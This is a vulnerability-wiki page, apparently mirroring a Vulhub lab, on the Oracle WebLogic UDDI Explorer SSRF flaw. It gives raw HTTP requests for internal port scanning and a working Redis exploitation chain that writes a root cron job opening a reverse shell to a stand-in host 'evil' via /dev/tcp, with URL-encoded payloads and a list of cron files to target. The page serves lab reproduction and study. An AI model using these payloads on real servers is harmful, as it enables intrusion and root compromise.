<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Weblogic/ssrf/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Weblogic UDDI Explorer Server-Side Request Forgery (SSRF) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Weblogic UDDI Explorer Server-Side Request Forgery (SSRF)", url: "#_top", children: [
              {title: "Environment Setup", url: "#environment-setup" },
              {title: "Vulnerability Reproduction", url: "#vulnerability-reproduction" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Weblogic UDDI Explorer SSRF漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2023-21839/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2023-21839/README.zh-cn/" class="btn btn-xs btn-link">
        WebLogic未授权远程代码执行漏洞 (CVE-2023-21839)
      </a>
    </div>
    
  </div>

    

    <h1 id="weblogic-uddi-explorer-server-side-request-forgery-ssrf">Weblogic UDDI Explorer Server-Side Request Forgery (SSRF)<a class="headerlink" href="#weblogic-uddi-explorer-server-side-request-forgery-ssrf" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Oracle WebLogic Server is a Java-based enterprise application server. A Server-Side Request Forgery (SSRF) vulnerability exists in WebLogic's UDDI Explorer application, which allows attackers to send arbitrary HTTP requests through the server, potentially leading to internal network scanning or attacks against vulnerable internal services like Redis.</p>
<p>References:</p>
<ul>
<li><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a></li>
<li><a href="https://foxglovesecurity.com/2015/11/06/what-is-server-side-request-forgery-ssrf/">https://foxglovesecurity.com/2015/11/06/what-is-server-side-request-forgery-ssrf/</a></li>
<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></li>
</ul>
<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
<p>Execute the following command to start a WebLogic server:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the server starts, visit <code>http://your-ip:7001/uddiexplorer/</code> to access the UDDI Explorer application. No authentication is required.</p>
<h2 id="vulnerability-reproduction">Vulnerability Reproduction<a class="headerlink" href="#vulnerability-reproduction" title="Permanent link">&para;</a></h2>
<p>The SSRF vulnerability exists in the SearchPublicRegistries.jsp page. Using Burp Suite, we can send a request to <code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code> to test this vulnerability.</p>
<p>First, we can try accessing an internal service like <code>http://127.0.0.1:7001</code>:</p>
<div class="highlight"><pre><span></span><code>GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
</code></pre></div>
<p>When accessing an available port, you will receive an error response with a status code. For non-HTTP protocols, you'll get a "did not have a valid SOAP content-type" error.</p>
<p><img alt="" src="1.png" /></p>
<p>When accessing a non-existent port, the response will be "could not connect over HTTP to server".</p>
<p><img alt="" src="2.png" /></p>
<p>By analyzing these different error messages, we can effectively scan the internal network.</p>
<h3 id="redis-shell-exploitation">Redis Shell Exploitation<a class="headerlink" href="#redis-shell-exploitation" title="Permanent link">&para;</a></h3>
<p>A notable characteristic of WebLogic's SSRF vulnerability is that despite being a GET request, we can inject newline characters using <code>%0a%0d</code>. Since services like Redis use newlines to separate commands, we can leverage this to attack internal Redis servers.</p>
<p>First, we scan the internal network for Redis servers (Docker networks typically use 172.* subnets) and find that <code>172.18.0.2:6379</code> is accessible:</p>
<p><img alt="" src="3.png" /></p>
<p>We can then send three Redis commands to write a shell script into <code>/etc/crontab</code>:</p>
<div class="highlight"><pre><span></span><code>set 1 &quot;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &#39;sh -i &gt;&amp; /dev/tcp/evil/21 0&gt;&amp;1&#39;\n\n\n\n&quot;
config set dir /etc/
config set dbfilename crontab
save
</code></pre></div>
<p>URL encode these commands:</p>
<div class="highlight"><pre><span></span><code>set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#39;sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261&#39;%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave
</code></pre></div>
<p>Send the encoded payload through the SSRF vulnerability:</p>
<div class="highlight"><pre><span></span><code>GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
</code></pre></div>
<p><img alt="" src="4.png" /></p>
<p>Successfully obtaining a reverse shell:</p>
<p><img alt="" src="5.png" /></p>
<p>Note that there are several locations where cron jobs can be exploited:</p>
<ul>
<li><code>/etc/crontab</code> (default system crontab)</li>
<li><code>/etc/cron.d/*</code> (system cron job directory)</li>
<li><code>/var/spool/cron/root</code> (CentOS root user cron file)</li>
<li><code>/var/spool/cron/crontabs/root</code> (Debian root user cron file)</li>
</ul>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Weblogic UDDI Explorer SSRF漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2023-21839/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2023-21839/README.zh-cn/" class="btn btn-xs btn-link">
        WebLogic未授权远程代码执行漏洞 (CVE-2023-21839)
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>